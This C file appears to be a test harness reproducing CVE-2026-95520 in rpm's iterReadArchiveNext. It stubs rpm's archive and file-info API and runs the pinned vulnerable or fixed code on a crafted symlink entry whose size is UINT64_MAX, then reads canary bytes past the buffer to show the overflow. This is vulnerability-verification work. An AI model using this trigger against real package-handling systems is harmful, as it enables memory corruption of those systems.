/*
 * Frontier harness for CVE-2026-95520 (rpm, iterReadArchiveNext).
 *
 * The two iterReadArchiveNext() bodies in ../pins/ are byte-exact excerpts of
 * lib/rpmfi.cc at the parent of fix 5bc8705e0 and at the fix itself. This file
 * supplies stand-ins for rpm's header/cpio/file-info API, a caller, and a
 * bounded payload consumer. No pinned byte is edited.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>

typedef int64_t rpm_loff_t;
typedef unsigned int rpm_mode_t;
typedef struct rpmfiles_s *rpmfiles;
typedef struct rpmarchive_s *rpmarchive;
typedef struct rpmfi_s {
    rpmfiles files;
    rpmarchive archive;
    unsigned char *found;
} *rpmfi;

enum {
    RPMERR_ITER_END     = -10,
    RPMERR_MISSING_FILE = -11,
    RPMERR_ITER_SKIP    = -12,
    RPMERR_READ_FAILED  = -13,
    RPMERR_UNMAPPED_FILE= -14,
    RPMERR_BAD_HEADER   = -15,
    RPMFILE_GHOST       = 0x08
};

static const char *g_link = "myscript.sh";
static rpm_loff_t g_size = -1;      /* UINT64_MAX as int64_t: -1 */
static const unsigned char *g_payload;
static size_t g_payload_len;
static void *g_last_alloc;
static void *g_freed;

#ifdef PLAIN_MODE
/* Retain the freed allocation so the chosen bytes past it can be read back. */
static void harness_free(void *p) { g_freed = p; }
#define free(p) harness_free(p)
#endif

void *xmalloc(size_t sz)
{
    void *p;
#ifdef PLAIN_MODE
    /* 64 readable bytes behind the requested allocation act as the canary. */
    p = malloc(sz + 64);
    memset(p, 0x5a, sz + 64);
#else
    p = malloc(sz);
#endif
    g_last_alloc = p;
    return p;
}

static rpm_loff_t rpmcpioRead(rpmarchive a, void *buf, rpm_loff_t len)
{
    size_t n = (size_t) len;
    (void) a;
    /* Real rpmcpioRead consumes len bytes from the payload. The stand-in
       copies the bytes that are actually present, capped at g_payload_len. */
    if (n > g_payload_len)
        n = g_payload_len;
    memcpy(buf, g_payload, n);
    return (rpm_loff_t) n;
}

static int rpmcpioHeaderRead(rpmarchive a, char **path, int *fx)
{
    (void) a;
    *path = strdup("/opt/linkme");
    *fx = 0;
    return 0;
}
static int rpmfilesFC(rpmfiles f) { (void) f; return 1; }
static int rpmfilesFindOFN(rpmfiles f, const char *path)
{ (void) f; (void) path; return 0; }
static int rpmfilesFFlags(rpmfiles f, int ix) { (void) f; (void) ix; return 0; }
static rpm_mode_t rpmfilesFMode(rpmfiles f, int ix)
{ (void) f; (void) ix; return S_IFLNK; }
static uint32_t rpmfilesFLinks(rpmfiles f, int ix, const int **links)
{ (void) f; (void) ix; *links = NULL; return 0; }
static rpm_loff_t rpmfilesFSize(rpmfiles f, int ix)
{ (void) f; (void) ix; return g_size; }
static const char *rpmfilesFLink(rpmfiles f, int ix)
{ (void) f; (void) ix; return g_link; }
static void rpmcpioSetExpectedFileSize(rpmarchive a, rpm_loff_t sz)
{ (void) a; (void) sz; }

#ifdef VARIANT_FIXED
#include "../pins/iter-fixed.inc"
#else
#include "../pins/iter-vulnerable.inc"
#endif

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "attack";
    unsigned char payload[64];
    struct rpmfi_s fi;
    int ret;

    memset(payload, 0x41, sizeof(payload));
    memcpy(payload, "MISHE-RPM!!", 11);
    g_payload = payload;
    g_payload_len = sizeof(payload);
    if (strcmp(mode, "safe") == 0)
        g_size = (rpm_loff_t) strlen(g_link);   /* 11, matches header link */
    else
        g_size = -1;                            /* UINT64_MAX symlink size */

    memset(&fi, 0, sizeof(fi));
    fi.files = (rpmfiles) 1;
    fi.archive = (rpmarchive) 1;
    fi.found = calloc(1, 1);
    ret = iterReadArchiveNext(&fi);
    printf("RET=%d\n", ret);
#ifdef PLAIN_MODE
    if (g_size == -1 && g_last_alloc != NULL && g_freed == g_last_alloc) {
        const unsigned char *past = (const unsigned char *) g_freed + 1;
        printf("CANARY_AFTER=");
        for (int i = 0; i < 16; i++)
            printf("%02x", past[i]);
        printf("\n");
    }
#endif
    return 0;
}
